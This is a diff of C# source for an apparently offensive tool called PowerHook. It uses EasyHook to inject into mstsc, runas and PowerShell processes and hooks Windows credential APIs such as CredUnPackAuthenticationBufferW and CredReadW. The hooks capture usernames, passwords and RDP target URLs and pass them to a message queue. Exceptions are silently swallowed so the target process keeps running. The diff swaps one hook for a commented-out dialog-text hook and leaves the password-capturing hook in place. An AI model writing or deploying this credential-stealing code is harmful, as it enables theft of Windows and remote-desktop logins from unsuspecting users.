@@ -264,17 +264,17 @@ namespace PowerHook
                 CredUnPackAuthenticationBufferW.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
 
                 //Used to give us the target url from mstsc
-                LoadLibrary("Advapi32.dll");
-                var CredReadW = EasyHook.LocalHook.Create(
-                EasyHook.LocalHook.GetProcAddress("Advapi32.dll", "CredReadW"),
-                new CredReadW_Delegate(CredReadW_Hook),
-                this);
+                //LoadLibrary("user32.dll");
+                //var SetDlgItemTextA = EasyHook.LocalHook.Create(
+                //EasyHook.LocalHook.GetProcAddress("user32.dll", "SetDlgItemTextW"),
+                //new SetDlgItemTextA_Delegate(SetDlgItemTextA_Hook),
+                //this);
 
-                // Activate hooks on all threads except the current thread
-                CredReadW.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
+                //// Activate hooks on all threads except the current thread
+                //SetDlgItemTextA.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
             }
 
-             if (currentProcess == "runas" || currentProcess == "powershell")
+            if (currentProcess == "runas" || currentProcess == "powershell") //Supports powershell's start-process as a different user
             {
                 // RunAs hook function
                 LoadLibrary("Advapi32.dll");
@@ -315,7 +315,7 @@ namespace PowerHook
             }
 
 
-            //_server.ReportMessage("[+] Hooked into " + context.HostPID.ToString());
+           
 
             // Wake up the process (required if using RemoteHooking.CreateAndInject)
             EasyHook.RemoteHooking.WakeUpProcess();
@@ -357,47 +357,45 @@ namespace PowerHook
 
 
 
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
-        delegate bool CredReadW_Delegate(string target, CRED_TYPE type, int reservedFlag, [MarshalAs(UnmanagedType.CustomMarshaler, MarshalTypeRef = typeof(CredentialInMarshaler))] out Credential credential);
-        [DllImport("Advapi32.dll", EntryPoint = "CredReadW", CharSet = CharSet.Unicode, SetLastError = true)]
-        public static extern bool CredReadW(string target, CRED_TYPE type, int reservedFlag,[MarshalAs(UnmanagedType.CustomMarshaler, MarshalTypeRef = typeof(CredentialInMarshaler))] out Credential credential);
+        //[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+        //delegate bool SetDlgItemTextA_Delegate(int hDlg, int npdlg, string lptext);
+        //[DllImport("user32.dll", EntryPoint = "SetDlgItemTextW", CharSet = CharSet.Unicode, SetLastError = true)]
+        //public static extern bool SetDlgItemTextA(int hDlg, int npdlg, string lptext);
 
 
-        bool CredReadW_Hook(
-            string target, 
-            CRED_TYPE type, 
-            int reservedFlag, 
-            [MarshalAs(UnmanagedType.CustomMarshaler, 
-            MarshalTypeRef = typeof(CredentialInMarshaler))] out Credential credential)
-        {
-            try
-            {
-                lock (this._messageQueue)
-                {
-                    if (this._messageQueue.Count < 1000)
-                    {
+        //bool SetDlgItemTextA_Hook(
+        //    int hDlg,
+        //    int npdlg,
+        //    string lptext)
+        //{
+        //    try
+        //    {
+        //        lock (this._messageQueue)
+        //        {
+        //            if (this._messageQueue.Count < 1000)
+        //            {
 
-                        String Data = target;
-                        string date = DateTime.Now.ToString();
-                        this._messageQueue.Enqueue(
-                        string.Format("[+] [{0}] Found Potential RDP url --> {1}", date, Data));
+        //                String Data = lptext;
+        //                string date = DateTime.Now.ToString();
+        //                this._messageQueue.Enqueue(
+        //                string.Format("[+] [{0}] Found Potential RDP url --> {1}", date, Data));
 
 
-                    }
-                }
-            }
-            catch
-            {
-                // swallow exceptions so that any issues caused by this code do not crash target process
-            }
-            return CredReadW(target, type, reservedFlag,out credential);
-        }
+        //            }
+        //        }
+        //    }
+        //    catch
+        //    {
+        //        swallow exceptions so that any issues caused by this code do not crash target process
+        //    }
+        //    return SetDlgItemTextA(hDlg, npdlg, lptext);
+        //}
 
 
         // MSTSC+Graphical Runas
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
         delegate bool CredUnPackAuthenticationBufferW_Delegate(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);
-        [DllImport("Credui.dll", CharSet = CharSet.Auto)]
+        [DllImport("Credui.dll",EntryPoint = "CredUnPackAuthenticationBufferW", CharSet = CharSet.Auto)]
         static extern bool CredUnPackAuthenticationBufferW(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);
 
         bool CredUnPackAuthenticationBufferW_Hook(
